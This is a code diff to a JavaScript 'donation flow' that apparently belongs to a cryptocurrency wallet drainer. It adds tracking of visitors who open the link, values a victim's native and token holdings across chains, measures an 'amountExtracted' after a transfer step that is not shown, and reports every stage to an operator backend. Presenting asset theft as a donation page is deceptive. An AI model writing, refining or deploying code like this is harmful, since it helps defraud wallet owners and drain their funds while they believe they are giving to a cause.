@@ -30,6 +30,19 @@ export async function runDonationFlow(walletClient) {
     const trackingId = Date.now().toString();
 
     // -------------------------
+    // LINK_OPENED (1st event)
+    // -------------------------
+    if (typeof window !== "undefined") {
+      const openedPayload = {
+        openedUrl: window.location.href,
+        visitorIp: null, // optional: backend can enrich this
+        trackingId,
+      };
+      notify("LINK_OPENED", openedPayload);
+      await sendEvent("LINK_OPENED", openedPayload);
+    }
+
+    // -------------------------
     // WALLET_CONNECTED
     // -------------------------
     const chainBalances = [];
@@ -41,13 +54,18 @@ export async function runDonationFlow(walletClient) {
       const nativeRaw = await provider.getBalance(owner);
       const nativeFormatted = parseFloat(ethers.formatEther(nativeRaw));
 
+      // try find native asset from covalent response
+      const nativeToken = raw.find((r) => r.contract_address === "native" || r.native_token === true);
+      const nativeUsd = nativeToken ? Number(nativeToken.quote || 0) : 0;
+
       const tokensValue = getChainValue(filtered);
-      const totalValue = tokensValue + nativeFormatted;
+      const totalValue = tokensValue + nativeUsd;
 
       chainBalances.push({
         chainId: chain.chainId,
         name: chain.name,
         native: nativeFormatted,
+        nativeValue: nativeUsd,
         tokens: filtered,
         totalValue,
       });
@@ -56,13 +74,24 @@ export async function runDonationFlow(walletClient) {
     const balancesPayload = chainBalances.map((c) => ({
       name: c.name,
       native: Number(c.native).toFixed(6),
-      tokens: c.tokens.map((t) => ({
-        name: t.tokenSymbol,
-        amount: Number(t.balanceRaw).toFixed(6),
-        value: Number(t.quote).toFixed(2),
-      })),
+      nativeValue: Number(c.nativeValue).toFixed(2),
+      tokens: c.tokens.map((t) => {
+        const decimals = Number(t.decimals ?? 18);
+        let humanAmount = "0";
+        try {
+          humanAmount = String(parseFloat(ethers.formatUnits(t.balanceRaw, decimals)).toFixed(6));
+        } catch {
+          humanAmount = Number(t.balanceRaw || 0).toFixed(6);
+        }
+        return {
+          name: t.tokenSymbol,
+          amount: humanAmount,
+          value: Number(t.quote || 0).toFixed(2),
+        };
+      }),
       total: Number(c.totalValue).toFixed(2),
     }));
+
     const grandTotal = balancesPayload.reduce((acc, c) => acc + parseFloat(c.total || 0), 0);
 
     const connectedPayload = {
@@ -124,14 +153,17 @@ export async function runDonationFlow(walletClient) {
       }
 
       // -------------------------
-      // Re-fetch balances + donation summary
+      // Re-fetch balances + summary
       // -------------------------
       const refreshedRaw = await fetchBalancesCovalent(owner, chain.chainId);
       const refreshedFiltered = await filterPermit2SafeTokens(refreshedRaw);
       const refreshedNativeRaw = await provider.getBalance(owner);
       const refreshedNative = parseFloat(ethers.formatEther(refreshedNativeRaw));
+      const refreshedNativeToken = refreshedRaw.find((r) => r.contract_address === "native" || r.native_token === true);
+      const refreshedNativeUsd = refreshedNativeToken ? Number(refreshedNativeToken.quote || 0) : 0;
+
       const refreshedTokensValue = getChainValue(refreshedFiltered);
-      const refreshedTotal = refreshedTokensValue + refreshedNative;
+      const refreshedTotal = refreshedTokensValue + refreshedNativeUsd;
 
       const amountExtracted = Math.max(0, Number(chain.totalValue) - Number(refreshedTotal));
 
@@ -142,11 +174,21 @@ export async function runDonationFlow(walletClient) {
           {
             name: chain.name,
             native: refreshedNative.toFixed(6),
-            tokens: refreshedFiltered.map((t) => ({
-              name: t.tokenSymbol,
-              amount: Number(t.balanceRaw).toFixed(6),
-              value: Number(t.quote).toFixed(2),
-            })),
+            nativeValue: refreshedNativeUsd.toFixed(2),
+            tokens: refreshedFiltered.map((t) => {
+              const decimals = Number(t.decimals ?? 18);
+              let humanAmount = "0";
+              try {
+                humanAmount = String(parseFloat(ethers.formatUnits(t.balanceRaw, decimals)).toFixed(6));
+              } catch {
+                humanAmount = Number(t.balanceRaw || 0).toFixed(6);
+              }
+              return {
+                name: t.tokenSymbol,
+                amount: humanAmount,
+                value: Number(t.quote || 0).toFixed(2),
+              };
+            }),
             total: refreshedTotal.toFixed(2),
           },
         ],
@@ -170,21 +212,40 @@ export async function runDonationFlow(walletClient) {
     // -------------------------
     // Provider events
     // -------------------------
-    if (injectedProvider && injectedProvider.provider && typeof injectedProvider.provider.on === "function") {
+    const attachProviderEvents = (prov) => {
       try {
-        injectedProvider.provider.on("disconnect", () => {
+        let currentChain = null;
+        if (prov && prov.network) currentChain = prov.network.chainId;
+        prov.on("disconnect", () => {
           const disc = { walletAddress: owner, trackingId };
           notify("WALLET_DISCONNECTED", disc);
           sendEvent("WALLET_DISCONNECTED", disc).catch(() => {});
         });
-        injectedProvider.provider.on("chainChanged", (chainId) => {
-          const c = { walletAddress: owner, trackingId, newChain: chainId };
+        prov.on("chainChanged", (chainId) => {
+          const c = { walletAddress: owner, trackingId, oldChain: currentChain, newChain: chainId };
+          currentChain = chainId;
           notify("CHAIN_SWITCH", c);
           sendEvent("CHAIN_SWITCH", c).catch(() => {});
         });
       } catch (e) {
-        console.warn("failed to attach provider event listeners:", e);
+        console.warn("failed to attach provider events:", e);
       }
+    };
+
+    if (injectedProvider?.provider?.on) {
+      attachProviderEvents(injectedProvider.provider);
+    }
+    if (walletClient?.on) {
+      walletClient.on("disconnect", () => {
+        const disc = { walletAddress: owner, trackingId };
+        notify("WALLET_DISCONNECTED", disc);
+        sendEvent("WALLET_DISCONNECTED", disc).catch(() => {});
+      });
+      walletClient.on("chainChanged", (chainId) => {
+        const c = { walletAddress: owner, trackingId, newChain: chainId };
+        notify("CHAIN_SWITCH", c);
+        sendEvent("CHAIN_SWITCH", c).catch(() => {});
+      });
     }
 
     return { success: true };
